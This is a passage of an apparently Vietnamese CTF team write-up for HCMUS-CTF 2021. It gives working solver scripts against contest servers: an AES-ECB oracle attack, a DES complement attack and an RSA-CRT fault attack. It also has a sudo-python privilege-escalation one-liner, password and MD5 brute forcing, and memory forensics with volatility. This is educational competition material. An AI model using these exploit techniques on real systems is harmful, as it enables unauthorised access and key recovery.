    for c in range(127,-1,-1):
        m = 'a'*i + flag + chr(c) + 'a'*i
        r.sendline(m)
        r.recvuntil("\n")
        ct = r.recvuntil("\n").strip().decode()
        ct = bytes.fromhex(ct)
        r.recvuntil("Your input: ")
        if ct[:16] == ct[16:32]:
            flag += chr(c)
            print("Flag:",flag)
            break

for i in range(15,-1,-1):
    for c in range(127,-1,-1):
        m = 'a'*i + flag + chr(c) + 'a'*i
        r.sendline(m)
        r.recvuntil("\n")
        ct = r.recvuntil("\n").strip().decode()
        ct = bytes.fromhex(ct)
        r.recvuntil("Your input: ")
        if ct[16:32] == ct[48:64]:
            flag += chr(c)
            print("Flag:",flag)
            break

# Flag: HCMUS-CTF{You_Can_4ttack_A3S!?!}
```

------

### CrackMe

> There is some way to crack the hash...
> author: pakkunandy
> [phase1.zip](https://github.com/hhthanhuyen/Writeups/blob/main/HCMUS-CTF-2021/challenges/phase1.zip)

Bài gồm 2 phase, phase 1 yêu cầu crack một password, phase 2 yêu cầu crack passphrase của một khóa RSA. Sau đó encode chuỗi bằng base64 để mở các file zip tương ứng.
Tool: *john - John the Ripper password cracker*.
Phase 1: playboy123
Phase 2: felecity

Flag: HCMUS_CTF{cracking_for_fun}

------

### DESX

> DESX = DES10 > DES3 > DES. In other word, this is the superior encryption algorithm.
> nc 61.28.237.24 30301
> author: mugi
> [desx.py](https://github.com/hhthanhuyen/Writeups/blob/main/HCMUS-CTF-2021/challenges/desx.py)

```
import os
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

i1 = os.urandom(8)
i2 = os.urandom(8)


def xor(a: bytes, b: bytes) -> bytes:
    return bytes([x ^ y for x, y in zip(a, b)])


def encrypt(k: bytes, p: bytes) -> bytes:
    cipher = DES.new(k, mode=DES.MODE_ECB)
    ct = b""
    for i in range(0, len(p), 8):
        block = p[i:i+8]
        ct += xor(cipher.encrypt(xor(block, i1)), i2)
    return ct


def decrypt(k: bytes, c: bytes) -> bytes:
    cipher = DES.new(k, mode=DES.MODE_ECB)
    return xor(cipher.decrypt(xor(c, i2)), i1)


with open("flag.txt", "rb") as f:
    flag = f.read().strip()

while True:
    print("Choose an option:")
    print("     1. Get encrypted flag")
    print("     2. Decrypt")
    option = int(input())
    if option == 1:
        k = os.urandom(8)
        c = encrypt(k, pad(flag, DES.block_size))
        print(f"Key: {k.hex()}")
        print(f"Encrypted flag: {c.hex()}")
    elif option == 2:
        print("Key: ")
        k = bytes.fromhex(input())
        print("Ciphertext: ")
        c = bytes.fromhex(input())

        if len(c) != 8:
            print("Invalid ciphertext length")
            break

        p = decrypt(k, c)
        if p in flag:
            print("This one right here, officer")
            break

        print(f"Plaintext: {p.hex()}")
    else:
        print("Invalid option")
        break
```

Server cho phép 2 lựa chọn, `Get encrypted flag` và `Decrypt`. Trong đó flag được mã hóa bằng DES-ECB: **<img src="https://latex.codecogs.com/gif.latex?\small&space;C_{i}&space;=&space;E_{k}(P_{i}\bigoplus&space;i_{1})&space;\bigoplus&space;i_{2}" title="\small C_{i} = E_{k}(P_{i}\bigoplus i_{1}) \bigoplus i_{2}" />**, với i1 và i2 là hai block cố định, không biết giá trị và server còn cho biết khóa `k` dùng để mã hóa. `Decrypt` chỉ được giải mã một block với khóa tự chọn, và được kiểm tra để tránh block được giải mã là flag.

Lưu ý DES có tính chất:
  [![\small \overline{C} = E_{\overline{k}}(\overline{P})](https://camo.githubusercontent.com/059ac72bb3a88897aa2b3c4e964a9185cf6bbf6c1c95f7df85f0ca7812dda7c3/68747470733a2f2f6c617465782e636f6465636f67732e636f6d2f6769662e6c617465783f5c736d616c6c2673706163653b5c6f7665726c696e657b437d2673706163653b3d2673706163653b455f7b5c6f7665726c696e657b6b7d7d285c6f7665726c696e657b507d29)](https://camo.githubusercontent.com/059ac72bb3a88897aa2b3c4e964a9185cf6bbf6c1c95f7df85f0ca7812dda7c3/68747470733a2f2f6c617465782e636f6465636f67732e636f6d2f6769662e6c617465783f5c736d616c6c2673706163653b5c6f7665726c696e657b437d2673706163653b3d2673706163653b455f7b5c6f7665726c696e657b6b7d7d285c6f7665726c696e657b507d29)
  [![\small \overline{P} = D_{\overline{k}}(\overline{C})](https://camo.githubusercontent.com/80b0ad80d6ec19d21e06596a6469c93a90b7bba32d47954e1944f5d082526293/68747470733a2f2f6c617465782e636f6465636f67732e636f6d2f6769662e6c617465783f5c736d616c6c2673706163653b5c6f7665726c696e657b507d2673706163653b3d2673706163653b445f7b5c6f7665726c696e657b6b7d7d285c6f7665726c696e657b437d29)](https://camo.githubusercontent.com/80b0ad80d6ec19d21e06596a6469c93a90b7bba32d47954e1944f5d082526293/68747470733a2f2f6c617465782e636f6465636f67732e636f6d2f6769662e6c617465783f5c736d616c6c2673706163653b5c6f7665726c696e657b507d2673706163653b3d2673706163653b445f7b5c6f7665726c696e657b6b7d7d285c6f7665726c696e657b437d29)

```
from pwn import remote, xor

r = remote("61.28.237.24", 30301)
r.recv()
r.sendline("1")
key = bytes.fromhex(r.recvuntil("\n").strip().split()[-1].decode())
ct = bytes.fromhex(r.recvuntil("\n").strip().split()[-1].decode())
fake_key = xor(b'\xff'*8,key)

flag = b''
for i in range(0,len(ct),8):
    r.recv()
    r.sendline("2")
    r.recv()
    r.sendline(fake_key.hex())
    r.recv()
    fake_ct = xor(b'\xff',ct[i:i+8])
    r.sendline(fake_ct.hex())
    flag += xor(b'\xff'*8,bytes.fromhex(r.recvuntil("\n").strip().split()[-1].decode()))
    print(flag)

# Flag: HCMUS-CTF{https://en.wikipedia.org/wiki/Data_Encryption_Standard#Minor_cryptanalytic_properties}
```

------

### RSB

> RSB > RSA nc 61.28.237.24 30302
> author: mugi
> [rsb.py](https://github.com/hhthanhuyen/Writeups/blob/main/HCMUS-CTF-2021/challenges/rsb.py)

```
from typing import List
from Crypto.Util.number import getStrongPrime, bytes_to_long


p = getStrongPrime(512)
q = getStrongPrime(512)
N = p * q
e = 65537

phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)


def crt(a: List[int], m: List[int]) -> int:
    """
    Chinese Remainder Theorem
    x \equiv a_0 (mod m_0)
    x \equiv a_1 (mod m_1)
    ...
    Assume that all m_i are pairwise coprime
    https://vi.wikipedia.org/wiki/%C4%90%E1%BB%8Bnh_l%C3%BD_s%E1%BB%91_d%C6%B0_Trung_Qu%E1%BB%91c
    """
    M = 1
    for mi in m:
        M *= mi

    x = 0
    for i in range(len(a)):
        a_i = a[i]
        m_i = m[i]

        M_i = M // m_i
        y_i = pow(M_i, -1, m_i)

        x = (x + a_i * M_i * y_i) % M
    return x


def encrypt(m: int) -> int:
    # Compute m^e mod N
    c = 1
    a = m
    k = e
    while k > 0:
        if k % 2 == 1:
            c = c * a % N
        a = a * a % N
        k = k // 2
    return c


def decrypt(c: int) -> int:
    """
    What's happening here?
    I compute:
        m_p = c^d mod p
        m_q = c^d mod q
    Then apply CRT to compute m

    Why?
    I heard that this approach is 4 times faster than the usual c^d mod N
    """

    # Compute c^d mod p
    m_p = 1
    a = c
    k = d
    while k > 0:
        if k % 2 == 1:
            m_p = m_p * a % p
        a = a * a % p
        k = k // 2

    # Compute c^d mod q
    m_q = 1
    a = c
    k = d
    while k > 0:
        if k % 2 == 1:
            m_q = m_p * a % q
        a = a * a % q
        k = k // 2

    return crt([m_p, m_q], [p, q])


with open("flag.txt", "rb") as f:
    flag = bytes_to_long(f.read().strip())

print(f"Public key: {N}")

logs_e = [flag]
logs_d = []
while True:
    print("Choose an option:")
    print("     1. Get encrypted flag")
    print("     2. Encrypt")
    print("     3. Decrypt")
    option = int(input())
    if option == 1:
        print(encrypt(flag))
        break
    elif option == 2:
        print("Plaintext: ")
        m = int(input())

        if m in logs_d:
            print("This one right here, officer.")
            break

        c = encrypt(m)
        print(f"Ciphertext: {c}")

        logs_e.append(c)
    elif option == 3:
        print("Ciphertext: ")
        c = int(input())

        if c in logs_e:
            print("This one right here, officer.")
            break

        m = decrypt(c)
        print(f"Plaintext: {m}")

        logs_d.append(m)
    else:
        print("Invalid option")
        break
```

Một bài về RSA-CRT Fault attack, ban đầu server gửi về giá trị của N, sau đó cho phép `Get encrypted flag`, `Encrypt` và `Decrypt`.
Thử decrypt giá trị pow(2,65537,N) thì được kết quả khác 2...

<img src="https://latex.codecogs.com/gif.latex?\small&space;Z_{N}^{*}&space;\cong&space;Z_{p}^{*}&space;\times&space;Z_{q}^{*}" title="\small Z_{N}^{*} \cong Z_{p}^{*} \times Z_{q}^{*}" /> , fault attack xảy ra khi có lỗi ở <img src="https://latex.codecogs.com/gif.latex?\small&space;Z_{p}^{*}" title="\small Z_{p}^{*}" /> hoặc <img src="https://latex.codecogs.com/gif.latex?\small&space;Z_{q}^{*}" title="\small Z_{q}^{*}" />.

Với m < p và m < q:
 <img src="https://latex.codecogs.com/gif.latex?\small&space;c^{d}\,mod\,N\,=\,(c^{d}\,mod\,p,\,c^{d}\,mod\,q)\,=\,(c^{dp}\,mod\,p,\,c^{dq}\,mod\,q)\,=\,(m,m)" title="\small c^{d}\,mod\,N\,=\,(c^{d}\,mod\,p,\,c^{d}\,mod\,q)\,=\,(c^{dp}\,mod\,p,\,c^{dq}\,mod\,q)\,=\,(m,m)" />.
  Nếu <img src="https://latex.codecogs.com/gif.latex?\small&space;c^{d}\,\equiv&space;\,m\,(mod\,p)" title="\small c^{d}\,\equiv \,m\,(mod\,p)" /> mà <img src="https://latex.codecogs.com/gif.latex?\small&space;c^{d}\,\not\equiv&space;\,m\,(mod\,q)" title="\small c^{d}\,\not\equiv \,m\,(mod\,q)" />, thì p | (c^d - m), do đó GCD(N, c^d - m) = p.

```
from pwn import remote
from Crypto.Util.number import GCD, long_to_bytes

r = remote('61.28.237.24', 30302)
n = int(r.recvuntil("\n").strip().split()[-1])
print("n:",n)

r.recv()
r.sendline('3')
r.recv()
r.sendline(str(pow(2,65537,n)))
m = int(r.recvuntil("\n").strip().split()[-1])
print("m:",m)

r.recv()
r.sendline('1')
f = int(r.recvuntil("\n").strip())
print("Encrypted flag:",f)
p = GCD(m-2,n)
q = n//p
d = pow(65537,-1,(p-1)*(q-1))
print(long_to_bytes(pow(f,d,n)).decode())

#Flag: HCMUS-CTF{fault-attack}
```

------

### Permutation

> Playing around with permutation is fun. nc 61.28.237.24 30303
> author: vuonghy2442
> [permutation.py](https://github.com/hhthanhuyen/Writeups/blob/main/HCMUS-CTF-2021/challenges/permutation.py)

```
from typing import List
import random

def get_permutation(n : int) -> List[int]:
    arr = list(range(n))
    random.shuffle(arr)
    return arr

def compose_permutation(p1 : List[int], p2 : List[int]):
    return [p1[x] for x in p2]

def permutation_power(p : List[int], n : int) -> List[int]:
    if n == 0:
        return list(range(len(p)))
    if n == 1:
        return p

    x = permutation_power(p, n // 2)
    x = compose_permutation(x, x)
    if n % 2 == 1:
        x = compose_permutation(x, p)
    return x


with open("flag.txt", "rb") as f:
    flag = int.from_bytes(f.read().strip(), byteorder='big')

perm = get_permutation(512)
print(perm)
print(permutation_power(perm, flag))
```

Bài cho một hoán vị của 512 phần tử, định nghĩa phép nhân vô hướng là n * Perm = Perm ∘ Perm ∘ ... ∘ Perm ∘ Perm (n lần).
Cho biết hoán vị P, và hoán vị Q = flag * P, tìm lại flag. Vậy phải tính logarit rời rạc trên nhóm các hoán vị để tìm flag.

Mỗi hoán vị P có thể biểu diễn dưới dạng các chu trình rời nhau, tìm ord(P) bằng cách lấy LCM của độ dài các chu trình, do ord(P) không quá lớn nên có thể tìm được giá trị x sao cho Q = x * P với flag ≡ x (mod ord(P)).

Một vấn đề khác xảy ra, ord(P) rất nhỏ so với flag, tìm flag = k*ord(P) + x (với k là một số nguyên) không khả thi. Để mở rộng modulo thì tìm thêm nhiều phương trình flag ≡ x (mod ord(P)), đưa về bài toán giải hệ phương trình đồng dư. Lưu ý các ord(P) này thường không nguyên tố cùng nhau, không thể sử dụng Chinese remainder theorem được. Có một phương pháp khác để giải quyết vấn đề này, dựa trên [answer](https://math.stackexchange.com/questions/1644677/what-to-do-if-the-modulus-is-not-coprime-in-the-chinese-remainder-theorem) của @AC.

```
from sage.all import *
from json import loads
from Crypto.Util.number import long_to_bytes
from sock import Sock


def compose_permutation(p1, p2):
    return [p1[x] for x in p2]

def permutation_power(p, n):
    if n == 0:
        return list(range(len(p)))
    if n == 1:
        return p
    
    x = permutation_power(p, n // 2)
    x = compose_permutation(x, x)
    if n % 2 == 1:
        x = compose_permutation(x, p)
    return x

def discrete_log(a, b, n):
    m = ceil(sqrt(n))
    l = []
    for j in range(m):
        l.append(permutation_power(a,j))
    inv_a = list(Permutation([x + 1 for x in a]).inverse())
    inv_a = [x - 1 for x in inv_a]
    inv_a_m = permutation_power(inv_a,m)
    y = b
    for i in range(m):
        if y in l:
            return i*m + l.index(y)
        y = compose_permutation(y, inv_a_m)


vals = []
mods = []
while True:
    r = Sock('61.28.237.24', 30303)
    g = loads(r.read_line().strip())
    y = loads(r.read_line().strip())
    r.close()

    _g = [i+1 for i in g]
    _g = list(Permutation(_g).to_cycles())
    lens = []
    for i in _g:
        lens.append(len(i))
    MOD = LCM(lens)

    if MOD < 100000000:
        #print(MOD)
        mods.append(MOD)
        vals.append(discrete_log(g,y,MOD))
        if len(mods) == 2:
            d,u,v = xgcd(mods[0],mods[1])
            l = (vals[0] - vals[1])//gcd(mods[0],mods[1])
            vals = [(vals[0] - mods[0]*u*l) % LCM(mods)]
            mods = [LCM(mods)]
            flag = long_to_bytes(vals[0])
            print(flag)
            if b'HCMUS-CTF' == flag[:9]:
                break

#Flag: HCMUS-CTF{discrete_log_is_easy_on_permutation_group}
```

----



# <a name="MISC"></a>MISC

### Dodge

```
sshpass -p "hcmus-ctf" ssh ctf@61.28.237.24  -p 30400 -t "bash --noprofile" ; cat flag.txt;
```

> HCMUS-CTF{You_know_some_command_line_stuff}

### StrangerThing

```
 sshpass -p "hcmus-ctf" ssh ctf@61.28.237.24  -p 30401
 (cat flag1.txt ;cat <-'flag 2.txt' ;cat secret/.flag3.txt) | tr '\n' ' ' | sed 's/ //g'
```

> HCMUS-CTF{this_is_used_to_test_linux_command_line}

### Escape me

```
sshpass -p "hcmus-ctf" ssh ctf@61.28.237.24  -p 30402
sudo /usr/bin/python3 -c "import os; os.system('/bin/bash')"
cat flag.txt
```

> HCMUS-CTF{privilege_escalation_is_fun!!!}
---



# <a name="FORENSIC"></a>FORENSIC

### NiceEars

* 1.Sử dụng `audacity` hoặc `Sonic Visualiser` để phân tích đoạn audio đính kèm.

  Với `Sonic Visualiser` làm theo các bước sau để xem [Spectrogram](https://en.wikipedia.org/wiki/Spectrogram) của dải tần số : `Layer -> Addspectrogram -> channel1`

  ![](https://kcsc-club.github.io/images/hcmus-ctf-2021/for/1.PNG)

2.Sử dụng mật khẩu: `M0nK3y_doNkeY` để trích xuất tệp nén và nhận được cờ.

> HCMUS-CTF{Just_give_you_some_points_from_audio_stuff}

### Saveme

Thử thách cung cấp một tệp text chứa các dữ liệu và gợi ý sau:

* Dòng offset 0000000 đầu tiên đã bị xáo trộn, có thể nhiều offset khác cũng đã bị trộn
* Ở các vị trí có `*` đã bị hoán đổi
* Các hex code đã bị hoán đổi cho nhau ví dụ hex code đúng `012c` bị đổi thành `2c01`

Ý tưởng, dựa vào vị trí các offset đổi thành `int` để lấy làm `index` cho các phần tử `hex`. Sau đó thực hiện chạy vòng lặp để điền các mã `hex` tương ứng vào đúng vị trí và hoán vị các mã `hex` liền kề đã bị xáo cho nhau.

Mã khôi phục hình ảnh gốc:

```python
data = open('text','rb').read()
fw = open('flag.jpg','wb')

data  = data.replace("\n*","")
ls = data.split("\n")
ls = (ls[:-1])[:-1]

#5c456 is last offset
arr = ['\x99'] * int("5c456", 16)
for l in ls:
	obj = l.split(" ")
    #convert offset to int index
	offset = int(obj[0], 16)
    #remove null element last of array
	obj = filter(None, obj)
	for hex_ in range(1,len(obj)):
		byte = obj[hex_].decode('hex')
        #shift hex code
		obj[hex_] = byte[::-1].encode('hex')
    #remove offset to join bytecode
	obj.pop(0)
	data_af = "".join(obj).decode('hex')
	for offset_ in range(len(data_af)):
        #insert value bytecode into array
		arr[offset + offset_] = data_af[offset_]

fw.write("".join(arr))
```

>HCMUS-CTF{You_Know_How_To_Manipulate_Images_1324587}

### Metadata

Lần lượt sử dụng các lệnh sau

```
docker pull vinhph2/hcmus-ctf-2021
cd var/lib/docker/
grep -rn "HCMUS-CTF{"
```

> HCMUS-CTF{d0ck6r_1mag6_1nsp6ct}

### maquerade

**<u>Thử thách này ở thời gian đầu đã gặp một số trục trặc, sau đó tác giả đã cập nhật lại các tệp đính kèm.</u>**

1. Sử dụng wireshark để `export http object` , sau khi trích xuất được 3 tệp sau.

* CheckPass.class
* OTP.mp3
* secret.zip

2.  Sử dụng một trình decompiler java để thực hiện xem `CheckPass.class` ở dạng `bytecode` thành mã java.
3. Sau đó, chỉnh sửa mã java sau khi decompiler để thực hiện `brute force` mật khẩu. Mật khẩu thu được là:  `897268$}`

```java

import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class CheckPass {
    public static void main(String[] paramArrayOfString) {
        genpwd();
    }

    public static void genpwd(){
        String symbol = "!#$%^*_=+-/?<>)";
        for (int i = 0 ; i < symbol.length() ; i++){
            for (int z = 0; z < 100000; z++ ){
                String n = String.format("%05d", z);
                char f = n.charAt(0);
                char last = symbol.charAt(i);
                String full_pwd = n + f + last + "}";
                if (check(full_pwd) == true){
                    System.out.println("Password is: " + full_pwd);
                    System.exit(0);
                }
            }
        }
    }
    public static boolean check(String str1){
        if (str1.length() != 8) {
            return false;
        }
        if (!str1.substring(0, 6).matches("[0-9]+")) {
            return false;
        }
        if (!str1.substring(0, 1).equals(str1.substring(5, 6))) {
            return false;
        }
        if (!str1.endsWith("}")) {
            return false;
        }
        String str2 = "(?![@',&])\\p{Punct}";
        if (!str1.substring(6, 7).matches(str2)) {
            return false;
        }
        if (!getMd5(str1).equals("53e443c9f65cd5f816452ae66ec65834")) {
            return false;
        }
        return true;
    }

    public static String getMd5(String paramString) {
        try {
            MessageDigest messageDigest = MessageDigest.getInstance("MD5");
            byte[] arrayOfByte = messageDigest.digest(paramString.getBytes());
            BigInteger bigInteger = new BigInteger(1, arrayOfByte);
            String str = bigInteger.toString(16);
            while (str.length() < 32)
                str = "0" + str;
            return str;
        } catch (NoSuchAlgorithmException noSuchAlgorithmException) {
            throw new RuntimeException(noSuchAlgorithmException);
        }
    }
}

```

4. Sử dụng  `mật khẩu` ở bước `3` để thực hiện trích xuất tệp nén `secret.zip` và thu được phần đầu của cờ `HCMUS-CTF{Just_Network_Stuff_ `                                                                                                                                                                                                                                                    

5. Phần 2 của cờ là mật khẩu ở bước `3`. Ta có được cờ hoàn chỉnh như bên dưới.

   

   > HCMUS-CTF{Just_Network_Stuff_897268$}

   Tệp `OTP.mp3` chưa cần sử dụng trong thử thách này.



### TestYourCmd

* key

Mở tệp `Evidences\.log\Master.png` thực hiện thay thế  `89 50 4E 47` với 4 byte đầu đã bị chỉnh sửa của ảnh.Ta thu được ảnh gốc:

![](https://kcsc-club.github.io/images/hcmus-ctf-2021/for/2.PNG)



Lệnh có chức năng copy những tin nhắn được gửi từ `Ronaldo` vào thư mục `images`:

```
 cp `grep -r "Send To: Ronaldo" | sed -e 's/To://g'` > images/ ; cd images
```

Lệnh có chức năng tìm ra các đoạn tin có chứa từ khóa `Messi`: 

```
grep -rn "Messi"
```

```
13bff2de21b5e589f010473b2af188be.log:2:From: Messi
56613b6b2616aa1aefbd6edb75a7fdc5.log:2:From: Messi
9fb0dbf9c55553c0c4d83b2ea36d0234.log:2:From: Messi
af08fa7cdd1912d920a35d2542e1e2c0.log:2:From: Messi
d346d027b686f43bea9a76e5d16a9bfc.log:2:From: Messi
d9480af67448f6e14dd29985616f4616.log:2:From: Messi
e79521d1d866f32ef2f0e7adbdc4cf3d.log:2:From: Messi
fd7faf6882396d5b4bb8ef51b9b94273.log:2:From: Messi
```

Giải mã `base64` cho đoạn tin này: 

```
cat 13bff2de21b5e589f010473b2af188be.log| tail -n 1 | base64 -d
```

Khóa : `SuPer_Gold_3ymArJr.`

* Flag

<u>*Lưu ý rằng steghide chỉ hỗ trợ định dạng ảnh jpg*</u>

Lệnh bên dưới thực hiện lưu đường dẫn các ảnh `jpg` vào tệp `files.txt`:

```
find . -iname *.jpg > files.txt
```

Sử dụng đoạn `bash script` sau để tự động kiểm tra và trích xuất nội dung được ẩn bên trong hình ảnh(Với khóa ở trên)

```bash
#!/bin/bash
#using: ./sol.sh files.txt
for a in $(cat $1); do
        steghide extract -sf $a -p "SuPer_Gold_3ymArJr." -xf flag.txt &> /dev/null
        if [ $? == 0 ]; then
                echo "Founded"
                cat flag.txt
                break
        else
                echo "nope!"
        fi
done
```

>HCMUS-CTF{at_least_I_hope_you_can_code_a_bit}

### Memory

Sử dụng `volatility tools` và plugin `chrome history`

`git clone https://github.com/superponible/volatility-plugins.git`

Sử dụng lệnh sau để lấy thông tin `image`:

```
volatility -f memory.raw imageinfo 
```
Thông tin trả về:

```

INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/sandbox/Documents/ctfs/hcmus/memory.raw)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf800028080a0L
          Number of Processors : 2
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80002809d00L
                KPCR for CPU 1 : 0xfffff880009eb000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2021-05-08 10:58:53 UTC+0000
     Image local date and time : 2021-05-08 17:58:53 +0700

```

Kiểm tra các process chạy trên hệ thống, thấy được 2 process khả ghi là `msdt.exe ` và ` chrome.exe `.

* Msdt.exe: là các tệp khởi chạy dịch vụ Giao dịch phân tán của Microsoft.
* chrome.exe: là một tệp thực thi chạy Trình duyệt web Google Chrome.

```
volatility --plugins="volatility-plugins/" -f memory.raw --profile=Win7SP1x64 psscan
```
Thông tin trả về:

```

0x000000001efc0b30 audiodg.exe        1652    804 0x00000000105c8000 2021-05-08 10:58:18 UTC+0000             
0x000000001efde6a0 msdt.exe           2000   1092 0x000000000862d000 2021-04-29 08:07:36 UTC+0000   2021-04-29 08:07:36 UTC+0000  
0x000000001f626630 chrome.exe         2504   1808 0x000000001942f000 2021-04-29 07:41:06 UTC+0000          
0x000000001f6379a0 SearchProtocol     3148   2332 0x0000000001937000 2021-05-08 10:58:06 UTC+0000         
0x000000001f6a6040 smss.exe            256      4 0x0000000018ae7000 2021-04-29 07:39:45 UTC+0000            
0x000000001f80b060 cmd.exe            3864   1092 0x000000001638d000 2021-05-08 10:48:40 UTC+0000                  
0x000000001f816b30 chrome.exe         3456   1808 0x000000000dab4000 2021-05-08 10:40:50 UTC+0000   2021-05-08 10:58:58 UTC+0000  
0x000000001f99b160 wininit.exe         384    316 0x0000000012cad000 2021-04-29 07:39:51 UTC+0000           
0x000000001fc49b30 wmpnetwk.exe       2740    472 0x000000000886a000 2021-04-29 07:42:29 UTC+0000        
0x000000001fceb060 msdt.exe            892   1092 0x0000000007b4e000 2021-04-29 08:07:36 UTC+0000   2021-04-29 08:07:36 UTC+0000  
0x000000001fd10060 GoogleCrashHan     1000   2028 0x000000000cc43000 2021-04-29 07:42:51 UTC+0000          
0x000000001fd11060 msdt.exe           2564   1092 0x0000000018b32000 2021-04-29 08:07:35 UTC+0000   2021-04-29 08:07:35 UTC+0000  
```

Sử dụng plugin như ở trên đã đề cập thực hiện xem lịch sử truy cập chrome:

```
volatility --plugins="volatility-plugins/" -f memory.raw --profile=Win7SP1x64 chromehistory --output=csv
```

Tìm được đường dẫn đến tệp `flag.zip` :`https://drive.google.com/file/d/1BBtY2q5h89Wkml6DLwlUSMJUUls3khtE/view`


Lệnh xuất ra thông tin các tệp ở mục `Desktop`:
```
volatility --plugins="volatility-plugins/" -f memory.raw --profile=Win7SP1x64 filescan | grep Desktop
```

Thông tin trả về:
```
0x000000001e8b68f0      2      1 R--rwd \Device\HarddiskVolume2\Users\Test\Desktop
0x000000001e8b6a40      2      1 R--rwd \Device\HarddiskVolume2\Users\Test\Desktop
0x000000001e8b8230      2      1 R--rwd \Device\HarddiskVolume2\Users\Public\Desktop
0x000000001e8c4070      2      1 R--rwd \Device\HarddiskVolume2\Users\Public\Desktop
0x000000001e903f20      2      0 RW-r-- \Device\HarddiskVolume2\Users\Test\Desktop\flag.txt.txt
0x000000001ea73c80      1      1 R--rw- \Device\HarddiskVolume2\Users\Test\Desktop
0x000000001ecfef20      1      0 R--rwd \Device\HarddiskVolume2\Users\Public\Desktop\desktop.ini
0x000000001ee3c820      1      0 R--rwd \Device\HarddiskVolume2\Users\Test\Desktop\desktop.ini
```

Thực hiện trích xuất tệp `flag.txt.txt`.
```
volatility -f memory.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000001e903f20 -D .
```

Thu được phần 2 của khóa:: `P@zzw0rD`.

Tiếp tục sử dụng lệnh bên dưới để xem lịch sử thực hiện các lệnh cmd.

```
volatility -f memory.raw --profile=Win7SP1x64 cmdscan
```
Thông tin trả về:
```
CommandProcess: conhost.exe Pid: 3900
CommandHistory: 0x2c0a40 Application: cmd.exe Flags: Allocated, Reset
CommandCount: 2 LastAdded: 1 LastDisplayed: 1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x64
Cmd #0 @ 0x299940: You should get the flag online
Cmd #1 @ 0x2c4de0: But here is the first part of the encryption key: SuP3r_
Cmd #15 @ 0x270158: +
Cmd #16 @ 0x2bfbb0: ,
**********************
```

Thu được phần đầu của khóa :: `SuP3r_`
Sử dụng khóa:: `SuP3r_P@zzw0rD` để thực hiện giải nén tệp `flag.zip` bên trên và thu được cờ.

> HCMUS-CTF{simple_memory_forensics_stuff}

------

# CONCLUSION

### Feedback from Web[er]

Trên đây là solution của  mình và cũng như quá trình mà mình đã giải được các challenge trong thời gian diễn ra cuộc thi, song song đó cũng có những kiến thức mới mà mình học được trong quá trình giải và mình đã diễn đạt nó theo cách mà bản thân mình hiểu được, do đó việc xảy ra sai sót là điều không thể tránh khỏi nên nếu có sai sót mong các bạn góp ý cho mình để trong các bài write-up sau mình sẽ diễn đạt tốt hơn, cũng như tìm hiểu kỹ hơn về những gì mình sắp trình bày cho các bạn. Và cuối cùng, cảm ơn BTC đã tạo ra một giải CTF cực kỳ bổ ích đến cho chúng mình! **** Happy hacking!! XD ***

### Feedback from For & Misc[er]

Cảm ơn BTC nói riêng và trường `Khoa học tự nhiên` nói chung đã tổ chức cuộc thi này, cũng như tạo sân chơi cho các bạn có niềm đa mê với lĩnh vực `an toàn thông tin`. Với các thử thách mình đã giải, thì đề được ra ở mức độ `dễ` đến `trung bình` . Đề không ` đánh đố ` người chơi cũng như không có tính `guessing` đã mang về cho BTC `100 điểm ` uy tín. Ngoài ra mình thấy đề có tính chất bao quát các kiến thức ` căn bản ` giúp cho người tham gia có được một lượng lớn kiến thức sau khi giải quyết các thử thách. Kết lại thì BTC đã tổ chức một giải vòng loại rất thành công, chúc các bạn lại có thêm 1 giải **chung kết** thành công hơn nữa .

### Feedback from Crypto[er]

Mình cảm ơn BTC đã tạo ra một sân chơi trí tuệ để mọi người có cơ hội giao lưu, học hỏi với nhau. Các bài Crypto hay, đa dạng, có tính phân loại các đội, mình ấn tượng nhất là bài Permutation. Chúc cho CLB ngày càng phát triển, tổ chức thêm nhiều cuộc thi bổ ích ạ.

### Feedback from Pwn + Re[er]

pwn thì đề khá là dễ với toàn bộ bài tác giả tập trung vào stack, tạo điều kiện cho cả người mới chơi có thể học được kiến thức và có cái nhìn tổng quan về pwnable như mình. 

RE mình đánh giá cao việc tác giả ra khá nhiều dạng bài và các dạng này sẽ bổ xung được lượng kiến thức nền rất ổn cho người chơi. Mặc dù đề còn lỗi và có thể bị thí sinh dùng trick không mong muốn để lấy flag.

### Blame

- Góp ý BTC nếu đã yêu cầu các đội nộp <u>write-up</u> thì nên mở server nhiều thời gian hơn cho các đội có môi trường để chạy lại mã khai thác và bổ sung thêm hình ảnh minh họa các thử thách.
- Nên chuẩn bị cẩn thận hơn về khâu **Setup server** để tránh tình trạng server chết nhiều lần trong thời gian cuộc thi diễn ra.